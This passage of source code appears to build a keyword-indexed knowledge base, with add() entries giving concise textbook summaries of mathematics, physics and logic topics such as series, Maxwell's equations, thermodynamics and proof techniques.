    'Limits and continuity: lim[x→a] f(x) = L means f(x) gets arbitrarily close to L as x approaches a. L\'Hôpital\'s rule: if 0/0 or ∞/∞, then lim f/g = lim f\'/g\'. ε-δ definition: ∀ε>0, ∃δ>0 such that |x-a|<δ → |f(x)-L|<ε. Continuous: lim[x→a] f(x) = f(a). Intermediate Value Theorem: if f continuous on [a,b] and f(a)<k<f(b), ∃c with f(c)=k. Squeeze theorem: if g≤f≤h and lim g = lim h = L, then lim f = L.', 1.2)

  add('math', ['series', 'sequence', 'convergence', 'taylor', 'power series'],
    'Sequences and series: Arithmetic: aₙ = a₁ + (n-1)d, sum = n(a₁+aₙ)/2. Geometric: aₙ = a₁rⁿ⁻¹, sum = a₁(1-rⁿ)/(1-r), infinite sum = a₁/(1-r) if |r|<1. Convergence tests: ratio test (lim|aₙ₊₁/aₙ|), root test, comparison, integral test. Taylor series: f(x) = Σf⁽ⁿ⁾(a)(x-a)ⁿ/n!. Common: eˣ = Σxⁿ/n!, sin(x) = Σ(-1)ⁿx²ⁿ⁺¹/(2n+1)!, cos(x) = Σ(-1)ⁿx²ⁿ/(2n)!, 1/(1-x) = Σxⁿ. Maclaurin series: Taylor at a=0.', 1.2)

  add('math', ['differential equation', 'ode', 'pde', 'diffeq'],
    'Differential equations: ODE involves derivatives of one variable. First-order separable: dy/dx = f(x)g(y) → ∫dy/g(y) = ∫f(x)dx. Linear first-order: y\' + P(x)y = Q(x), integrating factor μ = e^(∫P dx). Second-order constant coefficients: ay\'\' + by\' + cy = 0, characteristic equation ar² + br + c = 0. Homogeneous solutions: e^(rx), xe^(rx), or e^(αx)(cos βx, sin βx). PDE: heat equation uₜ = k·uₓₓ, wave equation uₜₜ = c²uₓₓ, Laplace equation ∇²u = 0. Methods: separation of variables, Fourier series.', 1.3)

  add('math', ['multivariable calculus', 'partial derivative', 'gradient', 'divergence', 'curl'],
    'Multivariable calculus: Partial derivatives: ∂f/∂x holds other variables constant. Gradient: ∇f = (∂f/∂x, ∂f/∂y, ∂f/∂z) — direction of steepest ascent. Divergence: ∇·F = ∂F₁/∂x + ∂F₂/∂y + ∂F₃/∂z (measures source/sink). Curl: ∇×F (measures rotation). Multiple integrals: ∬f dA (area), ∭f dV (volume). Green\'s theorem: ∮F·dr = ∬(∂Q/∂x - ∂P/∂y)dA. Stokes\' theorem: ∮F·dr = ∬(∇×F)·dS. Divergence theorem: ∯F·dS = ∭∇·F dV.', 1.2)

  // ── Geometry & Trigonometry ──
  add('math', ['geometry', 'triangle', 'circle', 'area', 'perimeter', 'volume'],
    'Geometry essentials: Triangle area = ½bh = ½ab·sinC. Circle: A = πr², C = 2πr. Sphere: V = 4πr³/3, SA = 4πr². Cylinder: V = πr²h. Cone: V = πr²h/3. Pythagorean theorem: a² + b² = c². Similar triangles: corresponding angles equal, sides proportional. Congruence: SSS, SAS, ASA, AAS. Triangle inequality: sum of any two sides > third side. Sum of interior angles of polygon = (n-2)·180°. Regular polygon: each angle = (n-2)·180°/n.', 1.2)

  add('math', ['trigonometry', 'sine', 'cosine', 'tangent', 'sin', 'cos', 'tan', 'trig'],
    'Trigonometry: sin θ = opposite/hypotenuse, cos θ = adjacent/hypotenuse, tan θ = sin/cos. Unit circle: sin²θ + cos²θ = 1. Key values: sin(0)=0, sin(30°)=½, sin(45°)=√2/2, sin(60°)=√3/2, sin(90°)=1. Double angle: sin(2θ) = 2sinθcosθ, cos(2θ) = cos²θ - sin²θ. Law of sines: a/sinA = b/sinB = c/sinC. Law of cosines: c² = a² + b² - 2ab·cosC. Inverse functions: arcsin, arccos, arctan. Radians: π rad = 180°. Identities: tan²θ + 1 = sec²θ, 1 + cot²θ = csc²θ.', 1.3)

  add('math', ['coordinate geometry', 'analytic geometry', 'distance', 'midpoint', 'slope'],
    'Coordinate/analytic geometry: Distance = √((x₂-x₁)² + (y₂-y₁)²). Midpoint = ((x₁+x₂)/2, (y₁+y₂)/2). Slope = (y₂-y₁)/(x₂-x₁). Line: y = mx + b or ax + by + c = 0. Parallel lines: same slope. Perpendicular: slopes multiply to -1. Circle: (x-h)² + (y-k)² = r². Ellipse: x²/a² + y²/b² = 1. Hyperbola: x²/a² - y²/b² = 1. Parabola: y = ax² + bx + c, focus-directrix form. Distance from point to line: |ax₀+by₀+c|/√(a²+b²).', 1.1)

  // ── Statistics & Probability ──
  add('math', ['statistics', 'mean', 'median', 'standard deviation', 'variance'],
    'Statistics: Mean (average) = Σxᵢ/n. Median = middle value (sorted). Mode = most frequent. Variance σ² = Σ(xᵢ-μ)²/n. Standard deviation σ = √variance. For samples: use n-1 (Bessel\'s correction). Normal distribution: 68% within 1σ, 95% within 2σ, 99.7% within 3σ. Z-score: z = (x-μ)/σ. Correlation: r = Σ(xᵢ-x̄)(yᵢ-ȳ) / √(Σ(xᵢ-x̄)²·Σ(yᵢ-ȳ)²), range [-1,1]. Regression: y = β₀ + β₁x where β₁ = r·(σy/σx).', 1.3)

  add('math', ['probability', 'bayes', 'conditional', 'random variable', 'distribution'],
    'Probability: P(A) = favorable outcomes / total outcomes, range [0,1]. P(A∪B) = P(A) + P(B) - P(A∩B). P(A|B) = P(A∩B)/P(B). Independent: P(A∩B) = P(A)·P(B). Bayes\' theorem: P(A|B) = P(B|A)·P(A)/P(B). Binomial: P(k successes in n trials) = C(n,k)·pᵏ(1-p)ⁿ⁻ᵏ. Expected value: E[X] = Σxᵢ·P(xᵢ). Poisson: P(k) = λᵏe⁻λ/k!. Normal distribution: bell curve, defined by μ and σ. Central Limit Theorem: sample means → normal as n→∞.', 1.3)

  add('math', ['combinatorics', 'permutation', 'permutations', 'combination', 'combinations', 'counting', 'factorial'],
    'Combinatorics: Permutations (order matters): P(n,r) = n!/(n-r)!. Combinations (order doesn\'t): C(n,r) = n!/(r!(n-r)!). Factorial: n! = n·(n-1)·...·1, 0!=1. Multiplication principle: if task A has m ways and B has n ways → m·n total. Addition principle: if A or B, m+n ways (if disjoint). Pigeonhole principle: if n items in m boxes and n>m, some box has ≥2 items. Stars and bars: distributing n identical items into k bins = C(n+k-1,k-1). Inclusion-exclusion: |A∪B∪C| = |A|+|B|+|C|-|A∩B|-|A∩C|-|B∩C|+|A∩B∩C|.', 1.3)

  // ── Number Theory ──
  add('math', ['number theory', 'prime', 'divisibility', 'modular arithmetic', 'gcd'],
    'Number theory: Prime numbers have exactly 2 divisors (1 and itself). Fundamental Theorem of Arithmetic: every integer > 1 has a unique prime factorization. GCD (Euclidean algorithm): gcd(a,b) = gcd(b, a mod b). LCM: lcm(a,b) = |a·b|/gcd(a,b). Modular arithmetic: a ≡ b (mod n) means n|(a-b). Fermat\'s little theorem: aᵖ⁻¹ ≡ 1 (mod p) for prime p. Euler\'s totient: φ(n) = count of integers ≤ n coprime to n. Chinese Remainder Theorem: system of congruences with coprime moduli has unique solution. Prime testing: trial division, Miller-Rabin.', 1.2)

  add('math', ['number system', 'integer', 'rational', 'irrational', 'real number'],
    'Number systems: ℕ (naturals: 0,1,2,...) ⊂ ℤ (integers: ...,-2,-1,0,1,2,...) ⊂ ℚ (rationals: p/q) ⊂ ℝ (reals) ⊂ ℂ (complex: a+bi). Irrational numbers: √2, π, e — cannot be expressed as p/q. Proof √2 is irrational: assume √2 = p/q in lowest terms → 2q² = p² → p is even → p=2k → 2q² = 4k² → q² = 2k² → q is even. Contradiction (both even, not lowest terms). Cardinality: |ℕ| = |ℤ| = |ℚ| = ℵ₀ (countably infinite), |ℝ| = 2^ℵ₀ (uncountably infinite, by Cantor\'s diagonal argument).', 1.2)

  // ── Discrete Math ──
  add('math', ['graph theory', 'graph', 'vertex', 'edge', 'tree', 'network'],
    'Graph theory: G = (V, E) — vertices and edges. Types: directed/undirected, weighted/unweighted, cyclic/acyclic. Degree of vertex = number of edges. Handshaking lemma: Σdeg(v) = 2|E|. Tree: connected acyclic graph with n-1 edges. Euler path: visits every edge once (exists iff 0 or 2 odd-degree vertices). Hamilton path: visits every vertex once (NP-complete to find). Planar graph: can be drawn without edge crossings (Euler\'s formula: V-E+F=2). Coloring: chromatic number = minimum colors so no adjacent vertices share color.', 1.2)

  add('math', ['set theory', 'set', 'union', 'intersection', 'subset', 'cardinality'],
    'Set theory: Collection of distinct elements. Notation: A = {1,2,3}. Operations: union (A∪B), intersection (A∩B), difference (A\\B), complement (Aᶜ). Subset: A⊆B if every element of A is in B. Empty set ∅ is subset of every set. Power set P(A) = set of all subsets, |P(A)| = 2^|A|. De Morgan\'s laws: (A∪B)ᶜ = Aᶜ∩Bᶜ, (A∩B)ᶜ = Aᶜ∪Bᶜ. Cartesian product: A×B = {(a,b) : a∈A, b∈B}. Functions: injection (1-to-1), surjection (onto), bijection (both). Cantor\'s theorem: |A| < |P(A)| for any set A.', 1.2)

  add('math', ['mathematical induction', 'induction', 'proof by induction'],
    'Mathematical induction: Prove statement P(n) for all n ≥ base. Step 1 (base case): verify P(base) is true. Step 2 (inductive step): assume P(k) is true (inductive hypothesis), prove P(k+1). Conclusion: P(n) holds for all n ≥ base. Strong induction: assume P(j) for all base ≤ j ≤ k, prove P(k+1). Example: prove Σᵢ₌₁ⁿ i = n(n+1)/2. Base: n=1 → 1 = 1·2/2 ✓. Inductive step: assume Σᵢ₌₁ᵏ i = k(k+1)/2, then Σᵢ₌₁ᵏ⁺¹ i = k(k+1)/2 + (k+1) = (k+1)(k+2)/2 ✓.', 1.3)

  // ── Advanced Math Topics ──
  add('math', ['abstract algebra', 'group', 'ring', 'field', 'algebraic structure'],
    'Abstract algebra: Group (G,·): closure, associativity, identity, inverses. Abelian group: also commutative. Examples: (ℤ,+), (ℤₙ,+), symmetry groups. Ring: two operations (+,·) where (R,+) is abelian group and · is associative with distribution. Field: commutative ring where every non-zero element has multiplicative inverse. Examples: ℚ, ℝ, ℂ, ℤₚ (p prime). Lagrange\'s theorem: order of subgroup divides order of group. Isomorphism: structure-preserving bijection. Homomorphism: preserves operations.', 1.1)

  add('math', ['topology', 'continuous function', 'open set', 'metric space'],
    'Topology: Study of properties preserved under continuous deformations. Open set: for every point, there\'s a small ball entirely contained. Topological space: set X with collection of open sets (includes ∅ and X, closed under union and finite intersection). Metric space: set with distance function d(x,y) satisfying d≥0, d(x,y)=0↔x=y, symmetry, triangle inequality. Continuous function: preimage of every open set is open. Homeomorphism: continuous bijection with continuous inverse. Famous: coffee mug ≅ donut (genus 1 surface). Compactness, connectedness, Hausdorff property.', 1.0)

  add('math', ['fourier', 'fourier transform', 'frequency', 'spectral', 'signal'],
    'Fourier analysis: Any periodic function can be decomposed into sum of sines and cosines. Fourier series: f(x) = a₀/2 + Σ(aₙcos(nx) + bₙsin(nx)). Fourier transform: F(ω) = ∫f(t)e^(-iωt)dt — converts time domain to frequency domain. Inverse: f(t) = (1/2π)∫F(ω)e^(iωt)dω. DFT (Discrete): for sampled signals, O(N²). FFT: O(N log N) — one of most important algorithms. Applications: signal processing, image compression (JPEG), audio (MP3), solving PDEs, quantum mechanics, spectroscopy.', 1.2)

  add('math', ['optimization', 'maximize', 'minimize', 'constraint', 'lagrange multiplier'],
    'Optimization: Find maxima/minima. Unconstrained: set gradient ∇f = 0, check second derivative (Hessian). Constrained: Lagrange multipliers — optimize f(x,y) subject to g(x,y)=0 → ∇f = λ∇g. Linear programming: optimize linear function subject to linear constraints (simplex method). Convex optimization: local minimum = global minimum. Gradient descent: x_{n+1} = xₙ - α∇f(xₙ). Newton\'s method: x_{n+1} = xₙ - f(xₙ)/f\'(xₙ). KKT conditions generalize Lagrange to inequality constraints.', 1.2)

  add('math', ['numerical methods', 'approximation', 'numerical analysis', 'interpolation'],
    'Numerical methods: Newton\'s method for root finding: xₙ₊₁ = xₙ - f(xₙ)/f\'(xₙ), quadratic convergence. Bisection method: guaranteed but slow (linear). Numerical integration: Trapezoidal rule, Simpson\'s rule (parabolic), Gaussian quadrature. Euler\'s method for ODEs: yₙ₊₁ = yₙ + h·f(xₙ,yₙ). Runge-Kutta (RK4): 4th order accuracy. Interpolation: Lagrange, Newton, spline. Linear systems: Gaussian elimination O(n³), LU decomposition, iterative (Jacobi, Gauss-Seidel). Floating point: IEEE 754, machine epsilon ≈ 2.2×10⁻¹⁶ (double).', 1.1)

  // ══════════════════════════════════════════════════════════════════════════════
  // ║  PHYSICS — Comprehensive physics knowledge base                           ║
  // ══════════════════════════════════════════════════════════════════════════════

  // ── Classical Mechanics ──
  add('physics', ['physics', 'newton', 'force', 'motion', 'mechanics', 'law of motion'],
    'Classical mechanics — Newton\'s Laws: 1st Law (inertia): object at rest stays at rest, object in motion stays in motion unless acted on by net force. 2nd Law: F = ma (force = mass × acceleration). 3rd Law: every action has an equal and opposite reaction. Weight: W = mg (g ≈ 9.81 m/s²). Friction: f = μN (coefficient × normal force). Free body diagrams: draw all forces on object, apply F_net = ma in each direction. Units: force in Newtons (N = kg·m/s²).', 1.4)

  add('physics', ['velocity', 'acceleration', 'kinematics', 'projectile', 'displacement'],
    'Kinematics (motion without forces): v = v₀ + at, x = x₀ + v₀t + ½at², v² = v₀² + 2a(x-x₀). Average velocity = Δx/Δt. Instantaneous velocity = dx/dt. Projectile motion: horizontal (vₓ = constant) + vertical (aᵧ = -g). Range = v₀²sin(2θ)/g. Maximum height = v₀²sin²θ/(2g). Time of flight = 2v₀sinθ/g. Optimal launch angle for max range = 45°. Circular motion: a_c = v²/r (centripetal), F_c = mv²/r.', 1.3)

  add('physics', ['energy', 'work', 'power', 'kinetic energy', 'potential energy', 'conservation of energy'],
    'Energy and work: Work W = F·d·cosθ (force × displacement × angle between). Kinetic energy: KE = ½mv². Potential energy: PE = mgh (gravitational), PE = ½kx² (elastic/spring). Conservation of energy: E_total = KE + PE = constant (no friction). Work-energy theorem: W_net = ΔKE. Power = W/t = F·v. Units: energy in Joules (J = N·m), power in Watts (W = J/s). Efficiency = useful energy out / total energy in. 1 calorie = 4.184 J. 1 kWh = 3.6×10⁶ J.', 1.3)

  add('physics', ['momentum', 'impulse', 'collision', 'conservation of momentum'],
    'Momentum: p = mv (mass × velocity). Impulse: J = FΔt = Δp. Newton\'s 2nd law: F = dp/dt. Conservation of momentum: in isolated system, Σp_before = Σp_after. Elastic collision: both momentum and KE conserved → v₁\' = (m₁-m₂)v₁/(m₁+m₂) + 2m₂v₂/(m₁+m₂). Inelastic collision: momentum conserved, KE not (some lost to deformation/heat). Perfectly inelastic: objects stick together → m₁v₁ + m₂v₂ = (m₁+m₂)v\'. Center of mass: x_cm = Σmᵢxᵢ/Σmᵢ.', 1.2)

  add('physics', ['rotation', 'torque', 'angular momentum', 'moment of inertia'],
    'Rotational mechanics: Angular velocity ω = dθ/dt. Angular acceleration α = dω/dt. Torque τ = r × F = Iα. Moment of inertia I = Σmᵢrᵢ² (resistance to angular acceleration). Common: solid sphere I = 2mr²/5, solid cylinder I = mr²/2, thin rod (center) I = ml²/12. Angular momentum L = Iω, conserved when no net torque (ice skater pulls arms in → spins faster). Rotational KE = ½Iω². Rolling without slipping: v = ωr. Parallel axis theorem: I = I_cm + md².', 1.2)

  add('physics', ['gravity', 'gravitational', 'orbit', 'kepler', 'satellite'],
    'Gravitation: Newton\'s law: F = Gm₁m₂/r² where G = 6.674×10⁻¹¹ N·m²/kg². Gravitational field: g = GM/r². Gravitational PE: U = -GMm/r. Escape velocity: v_esc = √(2GM/r) ≈ 11.2 km/s for Earth. Kepler\'s laws: 1) Orbits are ellipses with Sun at focus, 2) Equal areas swept in equal times, 3) T² ∝ a³ (period² ∝ semi-major axis³). Orbital velocity: v = √(GM/r). Geostationary orbit: T = 24h → r ≈ 42,164 km from Earth\'s center.', 1.2)

  add('physics', ['oscillation', 'spring', 'simple harmonic', 'pendulum', 'shm'],
    'Simple harmonic motion (SHM): x(t) = A·cos(ωt + φ). Restoring force: F = -kx (Hooke\'s law). Angular frequency: ω = √(k/m) for spring, ω = √(g/L) for pendulum. Period: T = 2π/ω. Frequency: f = 1/T. Energy: E = ½kA² (oscillates between KE and PE). Damped oscillation: x(t) = Ae^(-γt)cos(ω\'t), where ω\' = √(ω²-γ²). Resonance: driving frequency = natural frequency → maximum amplitude. Applications: clocks, springs, musical instruments, bridges.', 1.2)

  // ── Thermodynamics ──
  add('physics', ['thermodynamics', 'heat', 'temperature', 'entropy', 'law of thermodynamics'],
    'Thermodynamics: 0th Law: if A and B are in thermal equilibrium with C, then A and B are in equilibrium. 1st Law: ΔU = Q - W (energy conservation — internal energy change = heat added minus work done). 2nd Law: entropy of isolated system never decreases; heat flows hot→cold; no perfect engine. 3rd Law: entropy approaches zero as temperature approaches absolute zero. Temperature scales: K = °C + 273.15. Heat transfer: conduction (Q/t = kA·ΔT/L), convection, radiation (P = σεAT⁴). Specific heat: Q = mcΔT.', 1.3)

  add('physics', ['ideal gas', 'gas law', 'pressure', 'boyle', 'charles'],
    'Gas laws: Ideal gas law: PV = nRT (P=pressure, V=volume, n=moles, R=8.314 J/(mol·K), T=temperature in K). Boyle\'s law: PV = constant (at constant T). Charles\'s law: V/T = constant (at constant P). Avogadro: V/n = constant (at constant T,P). Combined: PV/T = constant. Kinetic theory: P = nMv²_rms/(3V), KE_avg = 3kT/2 where k = 1.381×10⁻²³ J/K (Boltzmann). Root mean square speed: v_rms = √(3RT/M). Real gases: van der Waals (P + a/V²)(V - b) = RT.', 1.2)

  add('physics', ['heat engine', 'carnot', 'efficiency', 'refrigerator'],
    'Heat engines and Carnot cycle: Engine converts heat to work. Efficiency η = W/Q_H = 1 - Q_C/Q_H. Carnot efficiency (maximum possible): η_Carnot = 1 - T_C/T_H (temperatures in Kelvin). No real engine can exceed Carnot efficiency. Refrigerator/heat pump: COP_refrigerator = Q_C/W = T_C/(T_H - T_C). Entropy: S = Q_rev/T. ΔS_universe ≥ 0 (2nd law). Processes: isothermal (ΔT=0), adiabatic (Q=0, PVᵞ=const), isobaric (ΔP=0), isochoric (ΔV=0).', 1.1)

  // ── Electromagnetism ──
  add('physics', ['electricity', 'charge', 'coulomb', 'electric field', 'electrostatics'],
    'Electrostatics: Coulomb\'s law: F = kq₁q₂/r² where k = 8.99×10⁹ N·m²/C². Like charges repel, opposites attract. Electric field: E = F/q = kQ/r² (points away from positive). Electric potential: V = kQ/r. Potential energy: U = kq₁q₂/r. Gauss\'s law: ∮E·dA = Q_enc/ε₀ (electric flux through closed surface = enclosed charge / ε₀). Capacitor: C = Q/V. Parallel plates: C = ε₀A/d. Energy stored: U = ½CV² = ½QV. Elementary charge: e = 1.602×10⁻¹⁹ C.', 1.3)

  add('physics', ['circuit', 'resistor', 'ohm', 'current', 'voltage', 'resistance'],
    'Electric circuits: Ohm\'s law: V = IR (voltage = current × resistance). Power: P = IV = I²R = V²/R. Resistors in series: R_total = R₁ + R₂ + ... (current same, voltage adds). Resistors in parallel: 1/R_total = 1/R₁ + 1/R₂ + ... (voltage same, current adds). Kirchhoff\'s laws: 1) Junction rule — current in = current out, 2) Loop rule — sum of voltage changes around loop = 0. Capacitors: series → 1/C_total = 1/C₁ + 1/C₂, parallel → C_total = C₁ + C₂. RC circuit: τ = RC (time constant).', 1.3)

  add('physics', ['magnetism', 'magnetic field', 'magnetic force', 'electromagnetic', 'faraday'],
    'Magnetism and electromagnetic induction: Magnetic force on moving charge: F = qv × B. Force on current-carrying wire: F = IL × B. Biot-Savart law: dB = (μ₀/4π)(Idl × r̂)/r². Ampère\'s law: ∮B·dl = μ₀I_enc. Solenoid: B = μ₀nI. Faraday\'s law: EMF = -dΦ_B/dt (changing magnetic flux induces voltage). Lenz\'s law: induced current opposes the change. Inductance: L = Φ_B/I. RL circuit: τ = L/R. Electromagnetic waves: c = 1/√(μ₀ε₀) = 3×10⁸ m/s. Maxwell\'s equations unify E&M.', 1.3)

  add('physics', ['maxwell', 'electromagnetic wave', 'light speed', 'spectrum'],
    'Maxwell\'s equations (differential form): 1) ∇·E = ρ/ε₀ (Gauss — charges create E fields), 2) ∇·B = 0 (no magnetic monopoles), 3) ∇×E = -∂B/∂t (Faraday — changing B creates E), 4) ∇×B = μ₀J + μ₀ε₀∂E/∂t (Ampère-Maxwell — current and changing E create B). Electromagnetic spectrum (by wavelength): radio > microwave > infrared > visible (ROYGBIV) > ultraviolet > X-ray > gamma. All EM waves travel at c = 3×10⁸ m/s in vacuum. E = hf (photon energy).', 1.2)

  // ── Waves & Optics ──
  add('physics', ['wave', 'wavelength', 'frequency', 'amplitude', 'sound', 'standing wave'],
    'Waves: v = fλ (speed = frequency × wavelength). Types: transverse (perpendicular displacement — light, string) and longitudinal (parallel — sound, compression). Superposition: waves add algebraically. Interference: constructive (in phase, amplitudes add) vs destructive (out of phase, cancel). Standing waves: nodes (no motion) and antinodes (max motion). Harmonics: fₙ = n·f₁. Sound: v ≈ 343 m/s in air. Doppler effect: f\' = f(v±v_observer)/(v∓v_source). Decibels: β = 10·log₁₀(I/I₀) where I₀ = 10⁻¹² W/m².', 1.2)

  add('physics', ['optics', 'lens', 'mirror', 'refraction', 'reflection', 'snell'],
    'Optics: Reflection: angle of incidence = angle of reflection. Refraction — Snell\'s law: n₁sinθ₁ = n₂sinθ₂. Total internal reflection: when θ > θ_critical = arcsin(n₂/n₁). Thin lens equation: 1/f = 1/d_o + 1/d_i. Magnification: M = -d_i/d_o = h_i/h_o. Converging lens (convex): f > 0, diverging (concave): f < 0. Mirror equation: same formula. Diffraction: light bends around obstacles. Double slit: d·sinθ = mλ (bright fringes). Single slit: a·sinθ = mλ (dark fringes). Polarization: filter orientation.', 1.2)

  // ── Modern Physics ──
  add('physics', ['quantum', 'quantum mechanics', 'wave function', 'schrodinger', 'uncertainty'],
    'Quantum mechanics: Wave-particle duality — matter exhibits both wave and particle properties. De Broglie wavelength: λ = h/p = h/(mv). Heisenberg uncertainty principle: ΔxΔp ≥ ℏ/2 (cannot simultaneously know exact position and momentum). Schrödinger equation: iℏ∂ψ/∂t = Ĥψ. |ψ|² = probability density. Quantization: energy levels are discrete (E_n = -13.6/n² eV for hydrogen). Quantum numbers: n (principal), l (angular), mₗ (magnetic), mₛ (spin ±½). Pauli exclusion: no two fermions share all quantum numbers.', 1.3)

  add('physics', ['relativity', 'einstein', 'special relativity', 'general relativity', 'spacetime'],
    'Relativity — Special (1905): Speed of light c is constant for all observers. Time dilation: Δt = γΔt₀ where γ = 1/√(1-v²/c²). Length contraction: L = L₀/γ. Mass-energy equivalence: E = mc² (rest energy), E² = (pc)² + (mc²)². Nothing with mass can reach c. General (1915): gravity = curvature of spacetime caused by mass-energy. Gravitational time dilation: clocks run slower in stronger gravity. Predictions: gravitational lensing, black holes, gravitational waves (detected 2015 by LIGO), GPS satellites must account for both effects.', 1.3)

  add('physics', ['atom', 'atomic', 'electron', 'proton', 'neutron', 'nucleus', 'radioactive'],
    'Atomic and nuclear physics: Atom = nucleus (protons + neutrons) + electrons. Atomic number Z = protons, mass number A = protons + neutrons. Isotopes: same Z, different A. Bohr model: electrons orbit in quantized levels, E_n = -13.6Z²/n² eV. Radioactive decay: α (⁴He nucleus), β⁻ (electron + antineutrino), β⁺ (positron + neutrino), γ (photon). Half-life: N(t) = N₀·(½)^(t/t½). Nuclear binding energy: E = Δmc². Fission: heavy nuclei split (uranium, plutonium — nuclear power). Fusion: light nuclei merge (hydrogen → helium — Sun\'s energy, future power).', 1.2)

  add('physics', ['standard model', 'particle', 'quark', 'lepton', 'boson', 'higgs'],
    'Standard Model of particle physics: Matter particles (fermions): 6 quarks (up, down, charm, strange, top, bottom) and 6 leptons (electron, muon, tau + their neutrinos). Force carriers (bosons): photon (electromagnetic), W±/Z⁰ (weak nuclear — radioactive decay), gluons (strong nuclear — holds quarks together), Higgs boson (gives mass via Higgs field, discovered 2012). Proton = uud, Neutron = udd. Antimatter: every particle has an antiparticle. Quarks are confined (never found alone). Four fundamental forces: gravity, electromagnetism, weak, strong.', 1.2)

  add('physics', ['fluid', 'pressure', 'buoyancy', 'bernoulli', 'fluid dynamics'],
    'Fluid mechanics: Pressure = F/A (Pa = N/m²). Atmospheric: 101,325 Pa = 1 atm. Hydrostatic pressure: P = P₀ + ρgh. Pascal\'s principle: pressure applied to enclosed fluid transmits equally everywhere. Archimedes\' principle: buoyant force = weight of displaced fluid (F_b = ρ_fluid·g·V_displaced). Object floats if ρ_object < ρ_fluid. Continuity equation: A₁v₁ = A₂v₂ (flow rate conserved). Bernoulli\'s equation: P + ½ρv² + ρgh = constant (energy conservation for fluids). Reynolds number: Re = ρvL/μ (laminar < 2300 < turbulent).', 1.2)

  // ══════════════════════════════════════════════════════════════════════════════
  // ║  LOGIC — Comprehensive logic and reasoning knowledge base                 ║
  // ══════════════════════════════════════════════════════════════════════════════

  // ── Propositional Logic ──
  add('logic', ['logic', 'proposition', 'truth table', 'propositional', 'logical operator'],
    'Propositional logic: Propositions are statements that are true or false. Connectives: AND (∧, conjunction), OR (∨, disjunction), NOT (¬, negation), IF-THEN (→, implication), IFF (↔, biconditional). Truth tables: p→q is false only when p=T and q=F. Tautology: always true (e.g., p∨¬p). Contradiction: always false (e.g., p∧¬p). Contingency: sometimes true. Logical equivalence: p→q ≡ ¬p∨q. Contrapositive: p→q ≡ ¬q→¬p. De Morgan: ¬(p∧q) ≡ ¬p∨¬q, ¬(p∨q) ≡ ¬p∧¬q.', 1.3)

  add('logic', ['predicate logic', 'quantifier', 'universal', 'existential', 'for all', 'there exists'],
    'Predicate logic: Extends propositional logic with variables and quantifiers. Universal quantifier ∀: "for all x, P(x)" — true if P holds for every x. Existential quantifier ∃: "there exists x such that P(x)" — true if P holds for at least one x. Negation: ¬∀x P(x) ≡ ∃x ¬P(x), ¬∃x P(x) ≡ ∀x ¬P(x). Nested quantifiers: ∀x∃y P(x,y) ≠ ∃y∀x P(x,y) (order matters!). Free vs bound variables. Domain of discourse: the universe of values x can take. First-order logic: quantify over individuals. Second-order: quantify over predicates.', 1.2)

  add('logic', ['boolean algebra', 'boolean', 'logic gate', 'and gate', 'or gate', 'nand', 'xor'],
    'Boolean algebra: Values: 0 (false) and 1 (true). Operations: AND (·), OR (+), NOT (\'). Laws: identity (a·1=a, a+0=a), null (a·0=0, a+1=1), idempotent (a·a=a, a+a=a), complement (a·a\'=0, a+a\'=1), commutative, associative, distributive, De Morgan (a·b)\' = a\'+b\', (a+b)\' = a\'·b\'. Logic gates: AND, OR, NOT, NAND (universal), NOR (universal), XOR (exclusive or), XNOR. NAND is functionally complete — any circuit can be built from NANDs alone. Karnaugh maps: simplify boolean expressions visually.', 1.3)

  add('logic', ['logical fallacy', 'fallacy', 'invalid argument', 'cognitive bias', 'ad hominem', 'straw man', 'red herring', 'slippery slope', 'fallacies'],
    'Logical fallacies — Formal: affirming the consequent (if p→q and q, concluding p), denying the antecedent (if p→q and ¬p, concluding ¬q). Informal: ad hominem (attack person not argument), straw man (misrepresent argument), false dichotomy (only two options), slippery slope (chain of unlikely consequences), appeal to authority, appeal to emotion, circular reasoning (begging the question), hasty generalization (small sample), red herring (irrelevant distraction), tu quoque (you too), bandwagon, post hoc ergo propter hoc (after therefore because of).', 1.5)

  // ── Proof Techniques ──
  add('logic', ['proof', 'direct proof', 'contradiction', 'contrapositive', 'proof technique'],
    'Proof techniques: 1) Direct proof: assume premises, derive conclusion through logical steps. 2) Proof by contradiction: assume negation of conclusion, derive a contradiction. 3) Proof by contrapositive: prove ¬q→¬p instead of p→q. 4) Proof by cases: split into exhaustive cases, prove each. 5) Mathematical induction: prove base case, then prove n→n+1. 6) Existence proof: constructive (show example) or non-constructive (show non-existence leads to contradiction). 7) Uniqueness proof: show existence, then assume two solutions and prove they\'re equal. 8) Disproof by counterexample.', 1.3)

  add('logic', ['deduction', 'deductive reasoning', 'syllogism', 'modus ponens', 'modus tollens'],
    'Deductive reasoning: guaranteed conclusions from premises. Modus ponens: if p→q and p, then q. Modus tollens: if p→q and ¬q, then ¬p. Hypothetical syllogism: if p→q and q→r, then p→r. Disjunctive syllogism: if p∨q and ¬p, then q. Resolution: (p∨q) ∧ (¬p∨r) → (q∨r). Universal instantiation: ∀x P(x) → P(a). Existential instantiation: ∃x P(x) → P(c) for some c. Valid argument: if all premises true, conclusion must be true. Sound argument: valid + premises are actually true.', 1.2)

  add('logic', ['inductive reasoning', 'abductive reasoning', 'analogy reasoning'],
    'Types of reasoning: 1) Deductive: general → specific, guaranteed (All men are mortal. Socrates is a man. Therefore Socrates is mortal). 2) Inductive: specific → general, probable (Every swan I\'ve seen is white, therefore all swans are white — can be wrong!). Strong induction: large/varied sample, conclusion not too broad. 3) Abductive: best explanation (The lawn is wet. Best explanation: it rained). Used in science/diagnosis. 4) Analogical: if A is similar to B in known ways, A may be similar in unknown ways. Strength depends on relevance of similarities.', 1.3)

  // ── Formal Systems & Computability ──
  add('logic', ['formal system', 'axiom', 'theorem', 'godel', 'incompleteness'],
    'Formal systems and Gödel: A formal system has axioms (assumed truths), rules of inference (valid deductions), and theorems (derived truths). Gödel\'s First Incompleteness Theorem (1931): any consistent formal system powerful enough to describe natural number arithmetic contains true statements that cannot be proved within the system. Second Incompleteness Theorem: such a system cannot prove its own consistency. Implications: mathematics cannot be fully formalized; there will always be undecidable statements. Halting problem (Turing): no algorithm can decide if arbitrary programs halt — closely related.', 1.2)

  add('logic', ['turing machine', 'computability', 'halting problem', 'decidable', 'algorithm'],
    'Computability theory: Turing machine — abstract model of computation with infinite tape, read/write head, and finite state control. Church-Turing thesis: any computable function can be computed by a Turing machine. Decidable problem: an algorithm can always give yes/no answer. Semi-decidable: algorithm says yes if true, may loop forever if false. Undecidable: no algorithm can decide all instances (e.g., halting problem). Complexity classes: P (polynomial time), NP (verifiable in polynomial time), NP-complete (hardest in NP). P vs NP: open millennium problem — does P = NP?', 1.2)

  add('logic', ['modal logic', 'necessity', 'possibility', 'temporal logic'],
